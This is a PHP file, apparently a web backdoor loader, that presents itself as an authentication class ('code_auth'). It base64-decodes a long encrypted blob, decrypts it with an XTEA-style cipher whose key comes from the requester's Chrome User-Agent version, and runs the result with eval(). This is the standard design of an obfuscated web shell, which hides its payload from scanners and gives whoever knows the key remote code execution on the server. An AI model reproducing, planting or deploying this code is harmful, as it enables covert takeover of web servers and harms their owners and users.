<?php
class code_auth{
	var $cd_str;
	function __construct(){
		$this->setIter(32);
	}
	function code2leng($start, &$data, &$data_long){
		$n = strlen($data);
		$tmp = unpack('N*', $data);
		$j  = $start;
		foreach ($tmp as $value) 
		$data_long[$j++] = $value;
		return $j;
	}
	function leng2code($l){
		return pack('N', $l);
	}
	function setIter($cd_str){
		$this->cd_str = $cd_str;
	}
	function getIter(){
		return $this->cd_str;
	}
	function uncode($enc_data){
		$keyone = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/Chrome\/(.*) Safari\//is',$keyone,$src)){
			$key = substr($src[1],0,9);
		}else{
			die();
		}
		$n_enc_data_long = $this->code2leng(0, $enc_data, $enc_data_long);
		$this->resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->code2leng(0, $key, $key_long);
		$data = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->decipherLong($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$data .= $this->leng2code($w[1]);
				}else{
					$data .= substr($this->leng2code($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$data .= $this->leng2code($w[0]);
					if ($pos + 8 <= $len){
						$data .= $this->leng2code($w[1]);
					}elseif($pos + 4 < $len){
						$data .= substr($this->leng2code($w[1]), 0, $len % 4);
					}
				}else{
					$data .= substr($this->leng2code($w[0]), 0, $len % 4);
				}
			}
		}
		return $data;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function resize(&$data, $size, $nonull = false){
		$n  = strlen($data);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = $data[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function decipherLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rshift($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rshift($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rshift($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
}


$str="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";
$srcstr = base64_decode($str); 
$code_auth = new code_auth(64); 
$strq = $code_auth->uncode($srcstr);
eval($strq);